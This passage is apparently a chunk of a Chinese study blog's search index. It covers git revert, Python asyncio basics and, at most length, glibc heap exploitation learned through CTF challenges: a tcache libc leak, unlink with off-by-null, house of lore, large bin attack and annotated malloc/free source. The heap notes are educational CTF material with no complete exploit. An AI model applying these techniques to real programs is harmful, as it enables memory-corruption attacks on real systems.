因为这次我的问题其实不属于这种情况但是还是写下来 方便以后查看\",\"简单总结就是如果我fork了一个分支 然后进行了修改 并且merge进入了master分支\",\"但是写太多bug了被revert了 我继续基于我的分支进行了fix bug 然后我想重新合并回去\",\"就不能直接git merge 而是先revert 掉revert我merge commit分支的那个commit（这里称为g commit）（这里很绕建议直接看原文章的图 写得很好）\",\"而是我们先revert掉g commit然后再merge进入master分支 不然会出问题（仅新的commit会被合并）\"]},\"61\":{\"h\":\"实践\",\"t\":[\"由于我们是common commit 也就是正常的commit 所以我们直接进行git revert HEAD即可（因为是最新的commit）\",\"image-20240317160934372\"]},\"62\":{\"h\":\"python asyncio学习\",\"t\":[\"文章:技术揭秘 | 理解 asyncio 来构建高性能 Python 网络程序 - 知乎 (zhihu.com)\",\"python中的asyncio使用详解_python asyncio-CSDN博客\"]},\"63\":{\"h\":\"基础对象\",\"t\":[\"Eventloop\",\"Future\",\"Promise\",\"Generator\"]},\"64\":{\"h\":\"eventloop\",\"t\":[\"注册事件 并对每个事件添加callback回调函数 会去循环以及准备好的堵塞事件 触发其回调函数\",\"class EventLoop: def __init__(self): self.events_to_listen = [] self.callbacks = {} def register(self,event,callback): self.events_to_listen.append(event) self.callbacks[event] = callback def unregister(self,event): self.events_to_listen.remove(event) del self.callbacks[event] def _process_events(self,events): for event in events: self.callbacks[events](event) def start_loop(self): while True: events_happend = poll_events(self.events_to_listen,timeout) self._process_events(events_happend) \",\"就相当于我们向里面注册会堵塞的事件 然后当这个事件完成的时候再自动触发其回调函数 这样就不会堵塞了\"]},\"65\":{\"h\":\"Future\",\"t\":[\"和名字表达的意思一样 也就是当一个函数是异步状态的时候 返回值通常不会马上获取到 为了代码的可读性以及逻辑的连贯性 我们选择返回一个future对象\",\"相当于为未来可能的值占位的作用 经历了promise过程后future将会塞入返回值 下面是其接口 简单来说就是设置删除检查三步走\",\"future值相关\",\"result()获取future的值\",\"set_result()设置future的值\",\"cancel()取消一个future\",\"cancancel()查看future是否已经被取消了\",\"add_done_callback(callback,*,context=None)设置一个future完成时候要触发的回调函数\",\"done()查看future是否有值\",\"异常相关\",\"exception()获取一个异常\",\"set_exception()设置异常\"]},\"66\":{\"h\":\"Generator生成器\",\"t\":[\"这种就类似于lua中的协程了 主要通过yield关键字来实现切换控制权\",\"当我们在函数使用了yield关键字后 函数调用的时候就变成了生成器 会返回一个生成器对象 此时函数并未真正在执行\",\"num = 0 def gen(): global num print(\\\"函数执行\\\") for i in range(3): num+= yield i g = gen() print(g) \",\"image-20240406165914445\",\"生成器对象.send(arg)后args会变成yield的返回值 出现在函数内部 并且当我调用send的时候 函数才会真正执行 send的返回值是yield右侧的值\",\"num = 0 def gen(): global num print(\\\"函数被调用\\\") for i in range(3): num+= yield i print(\\\"num的值为:\\\",num) g = gen() print(g.send(None)) print(g.send(3)) \",\"image-20240406170144040\"]},\"67\":{\"h\":\"基本使用\",\"t\":[\"asyncio.gather() 并发 启动\",\"await asyncio.gather(testa(1),testb(2)) \",\"这里testa和testb就同步运行了 只需要把函数调用(async声明的)作为参数传入asyncio.gather中即可\",\"task启动\"]},\"68\":{\"h\":\"c2018-HitCon-gundam(tcahe机制+泄露libc地址)\"},\"69\":{\"h\":\"重要知识点\",\"t\":[\"由于linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中。而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。\"]},\"70\":{\"h\":\"tcahe机制\",\"t\":[\"学习文章:glibc Tcache机制-CSDN博客\",\"一共有64个bins\",\"Tcache缓存的是非Large Chunk的chunk。\",\"首先是tcahe是单链表结构,每条链上最多可以有7个chunk\",\"free后 当对应的tcahe bin放满了 才会放入fastbin,unsorted bin\",\"malloc的时候优先去tcahe中找\"]},\"71\":{\"h\":\"机制\",\"t\":[\"代码:\",\"这里tcache_perthread_struct 首先\",\"counts代表着每个bin当前所有的chunk数量\",\"tcache_entry代表着当前bin的首个chunk\",\"由于是单链形式 所以结构体属性就是下一个chunk的指针\",\"typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \\\"tcache_perthread_struct\\\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; \",\"结构图\",\"机制\"]},\"72\":{\"h\":\"利用tcache泄露地址\",\"t\":[\"tcache位于heap最前端 也属于一个堆块\",\"用vmmap指令查找heap最开始的位置\",\"用x/26gx 指令来查看对应地址 堆结构 （x/26gx 0x55e22cd98000+0x10）\",\"heap\",\"也就是最后一个加入tcache的chunk\",\"我们通过连续申请8个gundam,让第八个gundam出现在unsorted bin里面 那么我们如何找到它呢?\",\"我们这里知道了第七个地址 那么第八个的地址:x/26gx 0x000055e22cd98a10+0x30+0x110-0x10\",\"一个gundam包含两个chunk,大小为0x30,另一个为0x110\",\"那么输入指令后我们找到了这个chunk\",\"unsorted_bins\",\"我们可以发现这个地方fd和bk都指向了 同一个地址 也就是main_arena+88(unsortedbin头结点)\",\"然后我们就得到了main_arena的地址\",\"再去查找libc的基地址 vmmap得到的:\",\"计算:\",\"0x7f566befac78-libc基地址0x7f566bb4f000=偏移0x3ac78\",\"这里我们就得到了偏移 这样在远程服务器的时候就可以利用这个偏移获取libc基地址\"]},\"73\":{\"h\":\"写一个计算chunk大小的程序\",\"t\":[\"由于做题的时候老是脑子不够用 无法根据malloc(num)中的num获取chunk的size 所以我就决定自己写一个程序来完成这个工作并且好好理解一下怎么计算的\"]},\"74\":{\"h\":\"原理\",\"t\":[\"最小chunk为0x20\",\"chunk一定是size_sz *2 的倍数(内存对齐)\",\"chunk可以占用下一个chunk的prev_size来存东西\",\"所以我们就是看是否malloc的大小 +size所占字节数 然后是否内存对齐 如果没有则加到对齐 然后 判断最后的size是否小于0x20 如果小于则直接等于0x20\",\"所以直接使用公式:(num + 8 +0xf)&~0xf; 其中num就是我们malloc传的参数\"]},\"75\":{\"h\":\"脚本\",\"t\":[\"#include <stdio.h> #include<stdlib.h> int main() { while (1) { int num = 0; int size = 0; int num2 = 0; printf(\\\"malloc:\\\"); scanf(\\\"%x\\\",&num); size = (num + 8 +0xf)&~0xf; if (size < 0x20) { size = 0x20; } if (size -16 < num) { printf(\\\"will take up prev_size of the next chunk\\\\n\\\"); } printf(\\\"0x%x\\\",size); fflush(stdin); printf(\\\"\\\\n\\\"); /* code */ } return 0; } \"]},\"76\":{\"h\":\"ezChunk(unlink+offbynull)\"},\"77\":{\"h\":\"分析一下题\",\"t\":[\"进入 addemo函数内部 查找关键结构体\",\"st数据看起来是关键\",\"(_DWORD *)&st_next12 + 10 * i 这个是存size的\",\"(_QWORD *)&st + 5 * i这个是emo content的内容\",\"(char *)&st + 40 * i + 20是存name的\",\"*((_DWORD *)&st_next8 + 10 * i)存使用情况\",\"我们这里开始简单运算一下 这个数组到底是怎么存放数据的 指针为char类型\",\"存size: point + 40 *i +12 存 int类型\",\"存content :point + 40 *i 存一个结构体指针\",\"存name: point + 40*i +20\",\"存使用情况:point +40*i +8 存一个int\",\"所以每个元素:\",\"type emo struct { Content *string // 0-8 IsUsed int // 8-12 Size int // 12-16 index int // 16-20 Name string[16] //20-36 } \"]},\"78\":{\"h\":\"chunk分析\",\"t\":[\"在addemo的时候name malloc(0x10) 马上free了 但是没有清空\",\"emo content的时候malloc(size)\",\"在delemo的时候是根据emo.isused来判断是否存在的\",\"emo.content被清空 并且被清空\",\"emo.isused被设置为0\",\"editemo的时候是根据判断emo.content是否为空去编辑的\",\"直接向emo.content中写入内容\",\"printemo是根据emo.content是否为空去判断的\",\"然后直接打印出来\"]},\"79\":{\"h\":\"漏洞学习\",\"t\":[\"这题存在off_by_null漏洞\",\"构造heap overlap 触发unlink漏洞\"]},\"80\":{\"h\":\"先学习unlink漏洞\",\"t\":[\"学习文章:一道题彻底理解 Pwn Heap Unlink-腾讯云开发者社区-腾讯云 (tencent.com)\",\"明确一下对象双向链表\",\"宏定义\",\"#define unlink(AV, P, BK, FD) \",\"P： 待脱链的空闲chunk的指针\",\"BK：后一个chunk的指针\",\"FD：前一个chunk的指针\"]},\"81\":{\"h\":\"流程\",\"t\":[\"大小检查\",\"if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); \",\"检查下一个chunk的prev_size是否与p的大小相同\",\"获取fd与bk\",\"通过p的fd/bk去获取前面一个chunk的fd和后面一个chunk的bk\",\"检查\",\"if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); \",\"这里很关键因为会检查前后chunk中 fd或者bk 指向的是否是p chunk\",\"这里等效为:\",\"P->fd->bk == P <=> *(P->fd + 0x18) == P p->bk->fd == P <=> *(p->bk + 0x10) == P \",\"那么就很明确了\",\"将p->fd置为 (&p-0x18)\",\"将p->bk设置为 (&p-0x10)\",\"脱链\",\"FD->bk = BK 与BK->fd = FD\",\"FD->bk = BK <=> P->fd->bk = p->bk <=> *(P->fd + 0x18) = P->bk //Ⅰ BK->fd = FD <=> P->bk->fd = p->fd <=> *(P->bk + 0x10) = P->fd //Ⅱ \",\"等效为: P->fd->bk = p->bk与 P->bk->fd = p->fd\",\"这里相当于让前后的chunk连接起来了 把中间的chunk忽略掉\"]},\"82\":{\"h\":\"调试技巧\",\"t\":[\"heap可以查看当前的chunk\"]},\"83\":{\"h\":\"学习路线:\",\"t\":[\"学习路线\",\"​\"]},\"84\":{\"h\":\"记一次高版本glibc(2.34)下常规overlapping失败的原因（vctf 2024 apples）\",\"t\":[\"昨天做vctf被打自闭了 由于对glibc高版本的保护不熟悉 第二题apples 连leak libc都没实现\",\"这里记录一下为什么常规overlapping会失效\"]},\"85\":{\"h\":\"版本\",\"t\":[\"glibc 2.34\",\"off_by_one漏洞\"]},\"86\":{\"h\":\"读题\",\"t\":[\"首先是add user部分 存在off_by_one漏洞\",\"image-20240317100413787\",\"delete部分无懈可击()\",\"img\"]},\"87\":{\"h\":\"错误思路\",\"t\":[\"由于前段时间做了hgame的week3的一道overlapping 所以我就自然想到了这题先利用overlapping leak出来我们的libc地址\",\"大概思路就是:\",\"先malloc 11个（第十一个防止合并）chunk 然后free 7个chunk 占满tacache\",\"然后free 第9chunk malloc回来 写入刚好size大小的数据（并且构造好prev_size） 让0溢出到 第10个chunk上\",\"最后我们free 第10个chunk 就可以利用合并机制 将fd和bk包含在这个大chunk中 再利用分割机制就可以泄露libc\",\"简化后的流程图就是:\",\"img\"]},\"88\":{\"h\":\"失败原因\",\"t\":[\"主要是glibc在高版本下的安全检查机制\",\"合并时对prev_chunk的size检查\",\"我们可以明显发现 这里多了一条if检查语句 用于检查计算prev_size得出的chunk的size大小是否等于我们的prev_size大小 这样就阻止了我们跨chunk进行合并\",\"glic-2.27下\",\"image-20240317101747206\",\"glibc-2.34下\",\"image-20240317101823846\"]},\"89\":{\"h\":\"House of lore学习\",\"t\":[\"主要是看着wiki 理解理解 然后自己看的glibc2.27的源码 抛开tcache部分\"]},\"90\":{\"h\":\"源码\",\"t\":[\"这里是去除了不重要的tcache bin判断部分\",\"if (in_smallbin_range (nb)){ idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) { bck = victim->bk; if (__glibc_unlikely (bck->fd != victim)) malloc_printerr (\\\"malloc(): smallbin double linked list corrupted\\\"); set_inuse_bit_at_offset (victim, nb); bin->bk = bck; bck->fd = bin; if (av != &main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } \"]},\"91\":{\"h\":\"漏洞利用图\",\"t\":[\"image-20240319205119155\",\"这里我们可以直观看见bck victim bin的相对位置 这里我简化了部分链\",\"由于定位bck是通过victim来确定的\",\"bck = victim->bk; \",\"所以一但我们劫持了victim的bk后 指向我们我们stack里面的空间 或者任何一个我们我们想控制的空间\",\"这样修改victim 中bk值 然后构造目标地址+0x18位置的地址为victim的地址 即可完成劫持 我们就可以malloc一个\",\"img\"]},\"92\":{\"h\":\"large Bin Attack学习（_int_malloc源码细读 ）\",\"t\":[\"参考文章:wiki:Large Bin Attack - CTF Wiki (ctf-wiki.org)源码级调试glibc:源码级调试glibc_glibc cannot be compiled without optimization-CSDN博客源码分析:glibc 2.31 malloc与free 源码分析（持续更新） - PwnKi - 博客园 (cnblogs.com)+glibc malloc源码分析 - PwnKi - 博客园 (cnblogs.com)详细拆分了_int_malloc的流程 并且按照功能分了标题 想要了解对应部分就直接点击标题跳转即可第一次阅读glibc的源码然后进行分析 有错误的地方请大佬指正\"]},\"93\":{\"h\":\"源码分析(largebin malloc)\",\"t\":[\"每次去看别人文章分析总结的 总感觉比较难记住 每个libc版本的区别 然后也没彻底理解一些操作 所以进行阅读源码\",\"然后重点是检查机制部分 如果只想看重点就直接跳转到largebin入链操作\",\"然后在正式阅读源码之前 我们先理清楚largebin的结构（去除了头部的fd_nextsize/bk_nextsize 为了图片干净一点）\",\"largebin_struct\",\"我们可以简化一下 去除尾链的fd和头链的bk方便我们理清逻辑\",\"large_struct\",\"大概就是这个样子 也就是bin头部通过fd/bk链接chunk size链表的头部和尾部 然后chunk size链表之间通过fd_nextsize/bk_nextsize链接\",\"chunksize链表中 同一个大小的chunk通过fd/bk进行链接\",\"所以largebin的fd和bk和其他的双向链不同我们不能通过从bin一路通过fd返回到large bin的头部\"]},\"94\":{\"h\":\"Unsortedbin的合并/入链/分配操作\"},\"95\":{\"h\":\"遍历的开始（梦的开始）\",\"t\":[\"后面的操作中最重要的就是Victim变量 这个变量是当前循环到的unsortedbin chunkbck变量 也就是bck <-------> victim 这个关系\",\"从unsorted_chunk最后一位开始遍历 直到碰到unsorted_bin的头部 我在这里 没很确定是否unsortedbin可不可以指向自己 我们可以调试看看\",\"while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)){ bck = victim->bk; size = chunksize (victim); /* 计算 size */ // ... } \"]},\"96\":{\"h\":\"调试\",\"t\":[\"unsortedbin all: 0x555555559680 —▸ 0x7ffff7fb9be0 (main_arena+96) ◂— 0x555555559680 \",\"然后查看chunk结构\",\"Free chunk (unsortedbin) | PREV_INUSE Addr: 0x555555559680 Size: 0x90 (with flag bits: 0x91) fd: 0x7ffff7fb9be0 bk: 0x7ffff7fb9be0 \",\"查看unsortedbin的大小\",\"pwndbg> tel 0x7ffff7fb9be0 00:0000│ rdx r10 r11 0x7ffff7fb9be0 (main_arena+96) —▸ 0x5555555597a0 ◂— 0x0 01:0008│ 0x7ffff7fb9be8 (main_arena+104) ◂— 0x0 02:0010│ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 03:0018│ 0x7ffff7fb9bf8 (main_arena+120) —▸ 0x555555559680 ◂— 0x0 04:0020│ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 05:0028│ 0x7ffff7fb9c08 (main_arena+136) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 06:0030│ 0x7ffff7fb9c10 (main_arena+144) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 07:0038│ 0x7ffff7fb9c18 (main_arena+152) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x555555559680 ◂— 0x0 \",\"可以发现fd bk都是指向的unsortedbin中第一个chunk 我们清空unsortedbin看看\",\"pwndbg> tel 0x7ffff7fb9be0 00:0000│ rsi r11 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 01:0008│ 0x7ffff7fb9be8 (main_arena+104) —▸ 0x555555559710 ◂— 0x90 02:0010│ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 03:0018│ 0x7ffff7fb9bf8 (main_arena+120) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 04:0020│ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 05:0028│ 0x7ffff7fb9c08 (main_arena+136) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— 0x0 06:0030│ 0x7ffff7fb9c10 (main_arena+144) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x555555559830 ◂— ... 07:0038│ 0x7ffff7fb9c18 (main_arena+152) —▸ 0x7ffff7fb9c00 (main_arena+128) —▸ 0x7ffff7fb9bf0 (main_arena+112) —▸ 0x7ffff7fb9be0 (main_arena+96) —▸ 0x55555555983 \",\"我们会发现fd和bk都是指向了自己本身也就是main_arena+96这个位置\"]},\"97\":{\"h\":\"安全检查机制\",\"t\":[\"这里的安全机制全是对unsortedbin中的chunk进行的检查\",\"不能小于2*SIZE_SZ不能大于av->system_men也就是该分配去的内存分配总量\",\"if (__glibc_unlikely (size <= 2 * SIZE_SZ) || __glibc_unlikely (size > av->system_mem)) malloc_printerr (\\\"malloc(): invalid size (unsorted)\\\"); \",\"对next chunk(物理意义上的紧挨着)也进行一样的操作\",\"mchunkptr next = chunk_at_offset (victim, size); /* 获得指向内存空间中当前 chunk 的下一个chunk 的指针 */\",\"if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)|| __glibc_unlikely (chunksize_nomask (next) > av->system_mem)) malloc_printerr (\\\"malloc(): invalid next size (unsorted)\\\"); \",\"检查next chunk的prev_size 是否等于当前的chunk size\",\"size = chunksize (victim); /* 计算 size */\",\"/* 如果 next chunk 中记录前一个 chunk 大小的 prev_size 与 size 不符，则报错 */ if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size)) malloc_printerr (\\\"malloc(): mismatching next->prev_size (unsorted)\\\"); \",\"检查bck的fd是否为当前chunk 或者当前chunk的fd是否是bin的头结点\",\"bck = victim->bk;\",\"victim = unsorted_chunks (av)->bk)\",\"应该就是检查下一个chunk是否是合法的\",\"if (__glibc_unlikely (bck->fd != victim) || __glibc_unlikely (victim->fd != unsorted_chunks (av))) malloc_printerr (\\\"malloc(): unsorted double linked list corrupted\\\"); \",\"检查当前chunk是否是free的 通过next chunk的p值\",\" /* 如果 next chunk 中的显示前一个 chunk 是否正在使用的标志位为1，*/ /* 即前一个 chunk 正在使用，则报错 */ if (__glibc_unlikely (prev_inuse (next))) malloc_printerr (\\\"malloc(): invalid next->prev_inuse (unsorted)\\\"); \"]},\"98\":{\"h\":\"直接返回smallbin_chunk情况\",\"t\":[\"然后就是从unsortedbin割small chunk 如果符合条件\",\"所需chunk大小在smallbin的范围之内\",\"bck为unsortedbin的头 也就是unsortedbin中仅有一个chunk\",\"victim为last remainder chunk 也就是分割过一次\",\"大小刚好大于所需nb大小+Minsize(这里猜测就是一个最小chunk 这样才能切割)\",\"满足以上条件 就直接分割 然后将victim返回给用户\",\"if (in_smallbin_range (nb) && bck == unsorted_chunks (av) && victim == av->last_remainder && (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder; av->last_remainder = remainder; remainder->bk = remainder->fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)){ remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } \"]},\"99\":{\"h\":\"从unsortedbin中移除\",\"t\":[\"在这里已经将chunk从unsortdbin中移除\",\" unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); \"]},\"100\":{\"h\":\"大小刚好相等情况\",\"t\":[\"如果chunk和当前需要的chunk大小一致 则直接返回chunk 并且设置物理意义上紧挨着的下一个chunk的size中p为0也就是free状态\",\"set_inuse_bit_at_offset (victim, size); \",\"如果开启了tcache机制 且tcache未满则将chunk放入tcache中\",\"if (tcache_nb && tcache->counts[tc_idx] < mp_.tcache_count){ tcache_put (victim, tc_idx); return_cached = 1; continue; } \",\"然后直接返回\",\"check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; /* 返回内存指针 */ \"]},\"101\":{\"h\":\"归类入链操作\",\"t\":[\"这里主要是将unsortedbin合并后的 入small链表或者large链表的操作\",\"这里的fwd和bck记好了 我们从unsortedbin抠出来的chunk就要合并进入fwd和bck的中间\",\"这后面的操作往往是先让fwd到指定的位置 然后bck通过fwd->bk来进行的定位\"]},\"102\":{\"h\":\"small 和 large最终入bin操作\",\"t\":[\"这里把最后的部分 直接提前 拿出来 因为smallbin和largebin的入链操作都含这个代码\",\"largebin还有chunk size的入链操作 以及其他的复杂检查\",\"mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \"]},\"103\":{\"h\":\"smallbin的fwd bck赋值\",\"t\":[\"如果属于small bin则进行fwd和bck的赋值\",\"small bin 的链表表头赋值给 bck:bck = bin_at (av, victim_index);\",\"首个chunk赋值给fwd :fwd = bck->fd;\",\"if (in_smallbin_range (size)){ victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; } \"]},\"104\":{\"h\":\"largebin 入bin链和chunk size链\",\"t\":[\"如果属于large_bins同理进行赋值 然后判断该插入什么合适的位置\",\"因为largebin是按照大小进行的排序 由大到小 所以最小的在链表最后\",\"victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck->fd; \",\"判断large是否有空闲chunk:\",\"if (fwd != bck) \",\"如果当前chunk比最后一位chunk还小则直接加入链表末尾\",\"bck是头 bck->bk应该就是最后一位\",\"然后要加入fwd和bck之间 我们应该先调整fwd和bck 所以bck改为链表最后一位 fwd改为链表头\",\"bck<----->chunk<----->fwd\",\"if ((unsigned long) (size)< (unsigned long) chunksize_nomask (bck->bk)){ fwd = bck; bck = bck->bk; victim->fd_nextsize = fwd->fd; victim->bk_nextsize = fwd->fd->bk_nextsize; fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; } \",\"否则进行遍历判断 匹配第一个小于等于 当前chunk的\",\"while ((unsigned long) size < chunksize_nomask (fwd)){ fwd = fwd->fd_nextsize; assert (chunk_main_arena (fwd)); } \",\"如果该chunk与当前chunk相同则让chunk插入fwd之后 所以\",\"因为large bin是按照大小进行的排序 所以我们为了不额外修改chunk size链表 直接将chunk链接到fwd后面\",\"if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd)) fwd = fwd->fd; \",\"当我们需求的chunk size大于large中所有的chunk size的情况 执行largebin的入chunk_size链操作:\",\"这里我理解的是largebin存在两条链 也就是chunk size的链 和fd bk构成的bins链 这里先是入的chunk size的链\",\"victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (nextsize)\\\"); fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; \",\"这里就是重点了 也就是large bin的入链操作\",\"首先这是初始状态\",\"让bck等于fwd->bk 也就是把bck提到fwd前方 并且进行安全检查\",\"bck = fwd->bk; if (bck->fd != fwd) malloc_printerr (\\\"malloc(): largebin double linked list corrupted (bk)\\\"); \",\"最后就是执行入链操作了\",\"在一开始的时候提过\",\"mark_bin (av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim; \"]},\"105\":{\"h\":\"从largebin中获取chunk\",\"t\":[\"largebin情况\",\"if (!in_smallbin_range (nb)) \"]},\"106\":{\"h\":\"chunk脱链 remainder chunk入链\",\"t\":[\"首先是判断情况 我们只处理这一种情况:largebin中有chunk 然后largebin中最大的chunk大于我们的需求\",\"接下来的代码都是从largebin中获取chunk\",\"if ((victim = first (bin)) != bin && (unsigned long) chunksize_nomask (victim)>= (unsigned long) (nb)) \",\"取最小的chunk 反方向循环 找到刚好大于等于我们所需chunk size的 chunk\",\"如果一个大小的chunk链表中有多个chunk 优先取第二个 不轻易改变chunk size链表的值\",\"// 取largebin的最后一个chunk 也就是最小的那个chunk victim = victim->bk_nextsize; // 取首个大于所需的chunk size的large chunk while (((unsigned long) (size = chunksize (victim)) < (unsigned long) (nb))) victim = victim->bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // 这里避免删除chunk size链中的首个chunk 避免我们修改chunk size链表 所以我们取第二个 if (victim != last (bin) && chunksize_nomask (victim) == chunksize_nomask (victim->fd)) victim = victim->fd; \",\"chunk 通过unlink脱链 remainder chunk入unsortedbin链\",\"安全检查 是否切割后的chunk大于minsize 与安全检查 largebin第一个chunk和头的互锁状态\",\" // 算剩余的remainder_size remainder_size = size - nb; // 对 我们large bin中的chunk 进行unlink操作 unlink_chunk (av, victim); /* Exhaust */ // 安全检查 如果切割的chunk 小于Minsize 则 设置下一个chunk p为0 if (remainder_size < MINSIZE){ set_inuse_bit_at_offset (victim, size); if (av != &main_arena) set_non_main_arena (victim); }else{ remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // 根据注释大概知道是进行完整的插入操作 // 取得unsorted_chunk bin链表的的头 bck = unsorted_chunks(av); // 取 第一个chunk fwd = bck->fd; // 安全检查:检查第一个chunk的bk是否为unsorted bin的头 if (__glibc_unlikely (fwd->bk != bck)){ malloc_printerr (\\\"malloc(): corrupted unsorted chunks\\\"); } // remainder 入unsortedbin remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; // 如果是remiander 则将fd_nextsize bk_nextsize 设置为null if (!in_smallbin_range (remainder_size)){ remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // 这里应该是设置head的一系列操作 set_head (victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); // foot就是下一个chunk的prev_size部分 set_foot (remainder, remainder_size); } \"]},\"107\":{\"h\":\"返回被切割后的chunk\",\"t\":[\"check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; \"]},\"108\":{\"h\":\"从topchunk中获取chunk\",\"t\":[\"我是大概浏览的 大概意思是去剩下的chunk中寻找 如果没找到就去topchunk分配 如果topchunk不够就去系统申请\"]},\"109\":{\"h\":\"_int_free_源码\",\"t\":[\" static void _int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ // 获取size大小 size = chunksize (p); /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \\\"design\\\" from some intruder. */ if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) malloc_printerr (\\\"free(): invalid pointer\\\"); /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // 要大于MINSIZE 以及内存对齐? if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size))) malloc_printerr (\\\"free(): invalid size\\\"); check_inuse_chunk(av, p); #if USE_TCACHE { size_t tc_idx = csize2tidx (size); if (tcache && tc_idx < mp_.tcache_bins && tcache->counts[tc_idx] < mp_.tcache_count) { tcache_put (p, tc_idx); return; } } #endif /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ // 如果是fastbin区间的 if ((unsigned long)(size) <= (unsigned long)(get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ && (chunk_at_offset(p, size) != av->top) #endif ) { // chunk的size值 得大于chunk最小值 得小于该区域分配的最大size if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<= 2 * SIZE_SZ, 0)|| __builtin_expect (chunksize (chunk_at_offset (p, size))>= av->system_mem, 0)){ bool fail = true; /* We might not have a lock at this point and concurrent modifications of system_mem might result in a false positive. Redo the test after getting the lock. */ if (!have_lock){ __libc_lock_lock (av->mutex); fail = (chunksize_nomask (chunk_at_offset (p, size)) <= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) >= av->system_mem); __libc_lock_unlock (av->mutex); } if (fail) malloc_printerr (\\\"free(): invalid next size (fast)\\\"); } // 清空chunk中除了prev_size 和size的地方 free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); atomic_store_relaxed (&av->have_fastchunks, true); // 